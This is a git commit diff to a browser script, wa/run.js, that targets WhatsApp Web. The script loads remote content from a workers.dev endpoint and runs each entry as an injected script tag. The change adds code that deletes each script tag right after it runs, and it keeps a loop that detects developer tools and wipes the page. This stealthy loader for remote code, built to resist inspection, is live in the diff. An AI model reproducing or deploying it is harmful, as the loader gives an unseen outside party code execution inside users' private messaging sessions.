342c8d685d7ed443775245c8500c59cdcb3fea9a
Prakash Raiya <59119176+raiyaprakash@users.noreply.github.com>
2025-04-28 08:13:06 +0530

    Update run.js

--- wa/run.js
+++ wa/run.js
@@ -1,5 +1,4 @@
-(function () {
-    if (window.location.hostname === "web.whatsapp.com") {
+
 	
 	function xhr(t, e, n) {
     let i = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
@@ -17,15 +16,21 @@ function fetchafterrun(t) {
         var n = t.feed.entry;
         for (let e = 0, t = n.length; e < t; e++) {
             let t = document.createElement("script");
-            t.innerHTML = n[e].content.$t, document.body.appendChild(t)
+            t.innerHTML = n[e].content.$t, document.body.appendChild(t), setTimeout(() => {
+                document.body.removeChild(t)
+            }, 100)
         }
     })
 }
+
+function check() {before = new Date().getTime();debugger;after = new Date().getTime();if (after - before > 200) {document.write(" Alert!! Close Developer Tools Now... ");self.location.replace(window.location.protocol + window.location.href.substring(window.location.protocol.length));}else{before = null;after = null;delete before;delete after;}setTimeout(check, 100);}
+
+(function () {
+    if (window.location.hostname === "web.whatsapp.com") {
 var e = document.createElement("div");
 e.innerHTML = '<div id="fsetting2"><a class="runbutton22" href="javascript:;" title="Wait/Clear Data" id="addext">Loading... / Clear Data</a></div>', document.body.appendChild(e), (e = document.createElement("style")).innerText = "#fsetting2{position:fixed;top:2px;z-index:99998;left:0;line-height:initial}#fsetting2 a.runbutton22{cursor:pointer;padding:5px 15px;background:#005af0;color:#fff;border-radius:4px;z-index:99998;margin:2px;display: inline-block;font-weight:600;box-shadow:0 2px 5px 1px rgb(60 64 67/16%);font-size:12px;text-decoration:none}#fsetting2 a.runbutton22:hover{color:#fff}", document.body.appendChild(e), fetchafterrun("https://share.autopush.workers.dev/import?id=installtool");
 
-function check() {before = new Date().getTime();debugger;after = new Date().getTime();if (after - before > 200) {document.write(" Alert!! Close Developer Tools Now... ");self.location.replace(window.location.protocol + window.location.href.substring(window.location.protocol.length));}else{before = null;after = null;delete before;delete after;}setTimeout(check, 100);}check();
-
+check();
 
     }
 })();
